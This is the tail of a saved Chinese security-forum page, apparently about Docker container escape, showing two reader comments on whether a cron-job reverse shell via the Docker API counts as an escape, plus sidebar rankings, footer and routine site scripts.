+                                <a class="label label-default" href="https://xz.aliyun.com/u/9027">ztos</a>
+                                
+                                <span class="bbs-time">2021-12-15 15:54:20</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>docker 未授权api这个，反弹的shell是容器内部的，个人感觉算不算逃逸</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="17604" data-topic="8558"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="ztos">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-17701">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/17268">zxx</a>
+                                
+                                <span class="bbs-time">2021-12-30 19:57:44</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p><a href="https://xz.aliyun.com/u/9027" target="_blank">@ztos</a> 并不是容器内部的，写的定时任务写到宿主机的 /etc/ 目录下了，在宿主机执行的定时任务，所以是逃逸。</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="17701" data-topic="8558"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="zxx">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8558%3Fpage%3D34&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8558%3Fpage%3D34&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/37846_ed0c5102d8f11328a1.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">28</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/45806" title="0x0101">0x0101</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/42911" title="呱呱yyy啊">呱呱yyy啊</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/35114_8e1dd527df8b7b1e27.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/35114" title="ajie">ajie</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                    <div class="member">
+                        <p class="text-center">暂无排行</p>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box" id="toc-container" style="width: 270px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 50px;"></div>
+            <ol style="top: 50px;"><li><a href="#toc-0">前言</a></li><li><a href="#toc-1">如何判断当前机器是否为Docker 容器环境</a></li><li><a href="#toc-2">Docker 逃逸的方法</a><ol><li><a href="#toc-3">危险的配置导致Docker 逃逸</a></li><li><a href="#toc-4">危险挂载导致Docker 逃逸</a></li><li><a href="#toc-5">程序漏洞导致Docker 逃逸</a></li><li><a href="#toc-6">内核漏洞导致Docker 逃逸</a></li></ol></li><li><a href="#toc-7">References</a></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+
+<script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/bootstrap.min.js"></script>
+<script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/xz.js"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8558%3Fpage%3D34&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8558%3Fpage%3D34&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/z_stat.php"></script>
+
+
+</body></html>
